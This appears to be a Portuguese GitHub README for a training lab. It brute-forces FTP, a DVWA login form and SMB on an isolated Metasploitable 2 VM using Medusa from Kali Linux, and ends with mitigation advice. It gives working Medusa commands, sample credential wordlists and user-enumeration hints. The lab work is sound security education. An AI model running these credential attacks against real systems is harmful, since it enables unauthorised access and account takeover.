# Desafio DIO: Ataques de Força Bruta com Medusa e Kali Linux

Este repositório documenta a implementação de um projeto prático para simular cenários de ataque de força bruta utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis como Metasploitable 2 e DVWA (Damn Vulnerable Web Application). O objetivo é exercitar a compreensão de ataques, a utilização de ferramentas de auditoria de segurança e a proposição de medidas de prevenção.

## Sumário

1.  [Visão Geral do Desafio](#visão-geral-do-desafio)
2.  [Configuração do Ambiente](#configuração-do-ambiente)
    *   [Máquinas Virtuais](#máquinas-virtuais)
    *   [Configuração de Rede](#configuração-de-rede)
3.  [Ataques Simulados](#ataques-simulados)
    *   [Força Bruta em FTP](#força-bruta-em-ftp)
    *   [Automação de Tentativas em Formulário Web (DVWA)](#automação-de-tentativas-em-formulário-web-dvwa)
    *   [Password Spraying em SMB](#password-spraying-em-smb)
4.  [Documentação dos Testes](#documentação-dos-testes)
    *   [Wordlists Utilizadas](#wordlists-utilizadas)
    *   [Comandos Medusa](#comandos-medusa)
    *   [Validação de Acessos](#validação-de-acessos)
5.  [Recomendações de Mitigação](#recomendações-de-mitigação)
6.  [Recursos Úteis](#recursos-úteis)

## Visão Geral do Desafio

O desafio proposto pela DIO visa aprofundar o conhecimento em segurança ofensiva, especificamente em ataques de força bruta. Através da prática, busca-se desenvolver habilidades na utilização de ferramentas como o Medusa no Kali Linux e na documentação de processos técnicos, além de fomentar a capacidade de identificar vulnerabilidades e propor soluções de mitigação.

## Configuração do Ambiente

### Máquinas Virtuais

Para este desafio, foram utilizadas duas máquinas virtuais (VMs) no VirtualBox:

*   **Kali Linux:** Máquina atacante, contendo as ferramentas necessárias para os testes de penetração, incluindo o Medusa.
*   **Metasploitable 2:** Máquina vítima, uma distribuição Linux intencionalmente vulnerável, ideal para ambientes de teste. Contém serviços como FTP, SMB e o DVWA (Damn Vulnerable Web Application).

### Configuração de Rede

A rede entre as VMs foi configurada como **Rede Interna (Host-Only)** no VirtualBox. Isso garante que as máquinas possam se comunicar entre si, mas fiquem isoladas da rede externa, criando um ambiente seguro para a simulação de ataques. É crucial que o Kali Linux e o Metasploitable 2 estejam na mesma faixa de IP para que os ataques funcionem corretamente.

## Ataques Simulados

### Força Bruta em FTP

O serviço FTP (File Transfer Protocol) no Metasploitable 2 é um alvo comum para ataques de força bruta devido a configurações padrão ou senhas fracas. O Medusa foi utilizado para tentar adivinhar credenciais de login.

**Comando Medusa:**

```bash
medusa -h <IP_METASPLOITABLE> -U wordlists/usernames.txt -P wordlists/passwords.txt -M ftp -t 5 -O ftp_results.txt
```

*   `-h <IP_METASPLOITABLE>`: Endereço IP da máquina Metasploitable 2.
*   `-U wordlists/usernames.txt`: Caminho para o arquivo contendo a lista de usuários.
*   `-P wordlists/passwords.txt`: Caminho para o arquivo contendo a lista de senhas.
*   `-M ftp`: Especifica o módulo FTP para o ataque.
*   `-t 5`: Define 5 threads para execução paralela.
*   `-O ftp_results.txt`: Salva os resultados em um arquivo.

### Automação de Tentativas em Formulário Web (DVWA)

O DVWA (Damn Vulnerable Web Application) possui uma seção de força bruta que simula um formulário de login. O Medusa pode ser configurado para interagir com este formulário, automatizando as tentativas de login.

**Comando Medusa:**

```bash
medusa -h <IP_METASPLOITABLE> -U wordlists/usernames.txt -P wordlists/passwords.txt -M web-form -m FORM:"/dvwa/login.php":"username=^USER^&password=^PASS^&Login=Login":F="Login failed" -t 5 -O dvwa_results.txt
```

*   `-h <IP_METASPLOITABLE>`: Endereço IP da máquina Metasploitable 2.
*   `-U wordlists/usernames.txt`: Caminho para o arquivo contendo a lista de usuários.
*   `-P wordlists/passwords.txt`: Caminho para o arquivo contendo a lista de senhas.
*   `-M web-form`: Especifica o módulo web-form para o ataque.
*   `-m FORM:"/dvwa/login.php":"username=^USER^&password=^PASS^&Login=Login":F="Login failed"`: Esta é a string mais crítica. Ela define:
    *   `"/dvwa/login.php"`: O caminho relativo para a página de login.
    *   `"username=^USER^&password=^PASS^&Login=Login"`: Os parâmetros do formulário, onde `^USER^` e `^PASS^` são substituídos pelas credenciais das wordlists. `Login=Login` representa o botão de submit.
    *   `F="Login failed"`: A string que o Medusa deve procurar na resposta da página para identificar uma tentativa de login falha.
*   `-t 5`: Define 5 threads para execução paralela.
*   `-O dvwa_results.txt`: Salva os resultados em um arquivo.

**Observação:** A string `FORM` pode variar dependendo da versão do DVWA e da configuração do formulário. É recomendável inspecionar o código-fonte da página de login do DVWA ou usar ferramentas como o Burp Suite para capturar a requisição e identificar os nomes exatos dos campos e o valor do botão de submit.

### Password Spraying em SMB

O SMB (Server Message Block) é um protocolo de rede que também pode ser alvo de ataques de força bruta, especialmente o password spraying, onde uma única senha comum é testada contra múltiplos usuários. O Medusa pode ser usado com o módulo `smbnt`.

**Comando Medusa:**

```bash
medusa -h <IP_METASPLOITABLE> -U wordlists/usernames.txt -P wordlists/passwords.txt -M smbnt -t 5 -O smb_results.txt
```

*   `-h <IP_METASPLOITABLE>`: Endereço IP da máquina Metasploitable 2.
*   `-U wordlists/usernames.txt`: Caminho para o arquivo contendo a lista de usuários.
*   `-P wordlists/passwords.txt`: Caminho para o arquivo contendo a lista de senhas (neste caso, uma senha comum).
*   `-M smbnt`: Especifica o módulo SMB para o ataque.
*   `-t 5`: Define 5 threads para execução paralela.
*   `-O smb_results.txt`: Salva os resultados em um arquivo.

**Observação:** Para um password spraying eficaz, a wordlist de senhas (`passwords.txt`) deve conter senhas comuns que são frequentemente reutilizadas. A enumeração de usuários (por exemplo, com `enum4linux` ou `nmap --script smb-enum-users`) é uma etapa prévia importante para obter uma lista de usuários válidos antes de realizar o password spraying.

## Documentação dos Testes

### Wordlists Utilizadas

As wordlists utilizadas para os ataques são simples e foram criadas para fins de demonstração. Em cenários reais, wordlists mais robustas e específicas seriam empregadas.

*   **`wordlists/usernames.txt`:**
    ```
    admin
    msfadmin
    user
    test
    guest
    root
    ```

*   **`wordlists/passwords.txt`:**
    ```
    password
    123456
    admin
    msfadmin
    root
    ```

### Comandos Medusa

Os comandos Medusa utilizados para cada serviço estão detalhados nas seções de [Ataques Simulados](#ataques-simulados). Os scripts shell (`.sh`) fornecidos neste repositório encapsulam esses comandos para facilitar a execução.

### Validação de Acessos

Após a execução de cada ataque, a validação do acesso bem-sucedido pode ser feita de diversas formas:

*   **Verificação dos arquivos de saída (`_results.txt`):** O Medusa registra as credenciais válidas encontradas nesses arquivos.
*   **Tentativa de login manual:** Utilizar as credenciais encontradas para tentar logar nos respectivos serviços (FTP, DVWA, SMB) e confirmar o acesso.

## Recomendações de Mitigação

Para proteger sistemas contra ataques de força bruta, as seguintes medidas são recomendadas:

*   **Políticas de Senhas Fortes:** Exigir senhas complexas que incluam letras maiúsculas e minúsculas, números e caracteres especiais, e que tenham um comprimento mínimo.
*   **Autenticação Multifator (MFA):** Implementar MFA para adicionar uma camada extra de segurança, mesmo que a senha seja comprometida.
*   **Bloqueio de Contas:** Configurar sistemas para bloquear contas após um número limitado de tentativas de login falhas.
*   **Limitação de Taxa (Rate Limiting):** Restringir o número de tentativas de login permitidas em um determinado período de tempo por endereço IP ou por conta.
*   **CAPTCHAs:** Utilizar CAPTCHAs em formulários de login para dificultar a automação por bots.
*   **Monitoramento e Alertas:** Implementar sistemas de monitoramento para detectar e alertar sobre atividades de login suspeitas ou um grande volume de tentativas falhas.
*   **Renomear Contas Padrão:** Alterar nomes de usuário padrão (ex: `admin`, `root`) para dificultar a enumeração de usuários.
*   **Atualização de Software:** Manter todos os sistemas e softwares atualizados para corrigir vulnerabilidades conhecidas.

## Recursos Úteis

*   [Kali Linux – Site Oficial](https://www.kali.org/)
*   [DVWA – Damn Vulnerable Web Application](https://dvwa.co.uk/)
*   [Medusa – Documentação (Man Page)](https://www.mankier.com/1/medusa)
*   [Nmap – Manual Oficial](https://nmap.org/book/man.html)
*   [GitHub Quick Start](https://github.com/digitalinnovationone/github-quickstart)
*   [Documentação do GitHub](https://docs.github.com/pt/)
*   [GitHub Markdown – Guia de sintaxe](https://docs.github.com/pt/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax)